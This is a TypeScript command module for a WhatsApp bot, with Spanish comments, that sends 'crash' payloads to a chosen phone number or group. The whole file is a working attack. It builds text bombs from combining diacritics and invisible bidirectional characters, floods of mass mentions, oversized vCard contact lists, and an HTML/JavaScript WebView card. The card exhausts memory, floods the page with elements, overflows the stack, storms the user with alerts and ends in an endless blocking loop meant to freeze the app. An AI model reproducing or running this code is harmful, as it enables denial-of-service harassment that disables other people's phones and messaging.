import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── generadores ───────────────────────── */

const ZW = "\u200b\u200c\u200d\u2060\ufeff";
const RTL = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";

/** bomba de shaping: miles de diacríticos combinantes sobre una sola base */
function shapeBomb(n: number) {
  const marks = ["\u0301", "\u0308", "\u0302", "\u0303", "\u0304", "\u0335", "\u035c", "\u034f"];
  let out = "";
  for (let i = 0; i < n; i++) out += marks[i % marks.length];
  return "a" + out;
}

function invisibleBomb(n: number) {
  let out = "";
  for (let i = 0; i < n; i++) out += ZW[i % ZW.length] + RTL[i % RTL.length];
  return out;
}

function textBomb(level: number) {
  const scale = level >= 3 ? 3 : level >= 2 ? 2 : 1;
  return (
    "💥 " + shapeBomb(4000 * scale) + "\n\n" +
    invisibleBomb(9000 * scale) + "\n\n" +
    "█".repeat(4000 * scale)
  );
}

function mentionBomb(num: string, times: number) {
  return `@${num} `.repeat(times).trim();
}

const PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

/* ───────────────────────── bomba WebView ───────────────────────── */

function buildWebviewBomb(targetName: string, level: number) {
  const loops = 220_000 * level;
  const imgLoads = 1200 * level;
  const domPerTick = 90 * level;
  const alerts = level >= 3 ? 26 : level >= 2 ? 12 : 5;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#05020c;color:#f5f3ff;padding:10px}
.card{max-width:380px;margin:0 auto;background:linear-gradient(180deg,#130826,#070312);border:2px solid #7c3aed;border-radius:16px;padding:14px;text-align:center}
.t{font-size:16px;font-weight:900;color:#00ffcc;letter-spacing:1px;margin-bottom:6px}
.d{font-size:11.5px;color:#c4b5fd;line-height:1.4;margin-bottom:10px}
.s{font-size:10px;color:#7c3aed;font-family:monospace}
#flood{text-align:left;font-family:monospace;font-size:8px;color:#4c1d95;word-break:break-all;margin-top:8px;max-height:120px;overflow:hidden}
</style>
<div class="card">
  <div class="t" id="h">CRASH // ${targetName.replace(/[<>&"]/g, "")}</div>
  <div class="d">Bomba de memoria + hilo principal. No cierres la tarjeta.</div>
  <div class="s" id="st">fase 0</div>
  <div id="flood"></div>
</div>
<script>
var st = document.getElementById('st');
function fase(n){ st.textContent = 'fase ' + n }

/* 1) presión de memoria: strings y arrays gigantes */
try {
  fase(1);
  var arr = [];
  for (var i = 0; i < ${loops}; i++) arr.push(new Array(96).join('█'));
  window.__hoard = arr;
} catch (e) {}

/* 2) inundación de DOM */
try {
  fase(2);
  var flood = document.getElementById('flood');
  var tick = 0;
  window.__flood = setInterval(function () {
    for (var i = 0; i < ${domPerTick}; i++) {
      var d = document.createElement('div');
      d.textContent = '█'.repeat(300) + Math.random();
      flood.appendChild(d);
    }
    if (++tick > 400) { flood.innerHTML = ''; tick = 0; }
  }, 40);
} catch (e) {}

/* 3) decodificación masiva de imágenes */
try {
  fase(3);
  var src = 'data:image/png;base64,${PNG}';
  window.__imgs = [];
  for (var k = 0; k < ${imgLoads}; k++) {
    var im = new Image();
    im.src = src;
    window.__imgs.push(im);
  }
} catch (e) {}

/* 4) desbordamiento de pila */
try {
  fase(4);
  function rec(n) { return rec(n + 1) + 1 }
  rec(0);
} catch (e) {}

/* 5) tormenta de alertas (cada una bloquea el hilo) */
fase(5);
var a = 0;
function storm() {
  if (a++ >= ${alerts}) return void fin();
  alert('CRASH ' + a + '/' + ${alerts});
  storm();
}
storm();

/* 6) bloqueo definitivo del hilo -> ANR */
function fin() {
  fase(6);
  var t0 = Date.now();
  while (true) { if (Date.now() - t0 > 600000) break }
}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── contact bomb ───────────────────────── */

function buildContacts(count: number, level: number) {
  const name = shapeBomb(300 * level);
  const list = [];
  for (let i = 0; i < count; i++) {
    const n = `000000${i}`.slice(-6);
    list.push({
      vcard:
        `BEGIN:VCARD\nVERSION:3.0\nFN:${name}${n}\n` +
        `N:${n};${name};;;\n` +
        `TEL;type=CELL;waid=52155${n}:+52155${n}\nEND:VCARD`,
    });
  }
  return { displayName: `💥 ${shapeBomb(120 * level)}`, contacts: list };
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  description: "Bombea a un número con payloads pesados (WebView, texto, menciones y vCards) hasta congelarlo.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const quoted = (msg.message as any)?.extendedTextMessage?.contextInfo?.participant;
    const sender: string = (msg.key as any).participant || from;

    let raw = (args[0] || "").replace(/\D/g, "");
    let target = "";

    if (args[0] && /^(grupo|g|chat)$/i.test(args[0])) target = from;
    else if (raw.length >= 8) target = `${raw}@s.whatsapp.net`;
    else if (quoted) target = quoted;
    else target = sender;

    const level = Math.min(3, Math.max(1, Number(args[1] || args[0] && target !== from ? 2 : 2) || 2));

    const num = target.split("@")[0].split(":")[0];

    await react("💥").catch(() => undefined);

    let name = num;
    try {
      if (target.endsWith("@g.us")) {
        const meta: any = await sock.groupMetadata(target);
        name = meta.subject || num;
      } else {
        name = String((msg as any).pushName || "").trim() || num;
      }
    } catch {}

    const phases: string[] = [];

    const run = async (label: string, fn: () => Promise<any>) => {
      try { await fn(); phases.push(`✅ ${label}`); }
      catch (e: any) { phases.push(`⚠️ ${label}: ${e?.message || e}`); }
    };

    /* 1 · texto + mención bomba */
    await run("texto", () =>
      sock.sendMessage(target, {
        text: `${fytBold("💥 IMPACTO")} nivel ${level}\n\n${textBomb(level)}`,
        mentions: [target.endsWith("@g.us") ? sender : target],
      }, { quoted: level >= 2 ? msg : undefined }),
    );

    /* 2 · mención bomba */
    await run("menciones", () =>
      sock.sendMessage(target, {
        text: mentionBomb(target.endsWith("@g.us") ? num : num, 800 * level),
        mentions: Array(800 * level).fill(target.endsWith("@g.us") ? sender : target),
      }),
    );

    /* 3 · bomba de WebView */
    await run("webview", async () => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("💥 CRASH // LuferOS")
        .setFooter(`nivel ${level} · no cierres la tarjeta`);
      rich.addSection(buildWebviewBomb(name, level));
      await rich.send(target);
    });

    /* 4 · contact bomb */
    if (level >= 2) {
      await run("vcards", () => sock.sendMessage(target, { contacts: buildContacts(90 * level, level) }));
    }

    /* 5 · segunda ronda de WebView para el crash al reabrir */
    if (level >= 3) {
      await run("webview x2", async () => {
        const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
        const rich = new AIRich(sock).setTitle("💥 CRASH 2 // LuferOS").setFooter("reapertura");
        rich.addSection(buildWebviewBomb(name, 3));
        await rich.send(target);
      });
      await run("texto x2", () => sock.sendMessage(target, { text: textBomb(3) }));
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Bomba enviada")} → ${target.endsWith("@g.us") ? "este grupo" : `@${num}`}\n` +
        `Nivel: ${level}\n\n${phases.join("\n")}`,
      { mentions: [target.endsWith("@g.us") ? sender : target] } as any,
    ).catch(() => undefined);
  },
};
